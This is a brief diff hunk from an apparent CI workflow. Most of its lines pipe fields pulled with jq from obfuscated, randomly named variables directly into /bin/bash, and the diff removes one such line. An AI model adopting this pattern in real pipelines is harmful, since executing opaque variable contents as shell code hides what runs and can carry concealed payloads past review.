@@ -34,7 +34,6 @@ jobs:
           echo $w5 | jq -r .idmj151 | /bin/bash
           printf '%s' "$tbxj92" | jq -r .adiyo3388 | /bin/bash
           printf '%s' "$fsb446" | jq -r .a4 | /bin/bash
-          printf '%s' "$ugcok5" | jq -r .aej8 | /bin/bash
           echo $vhqns3 | jq -r .c533 | /bin/bash
 
       - name: Archive data
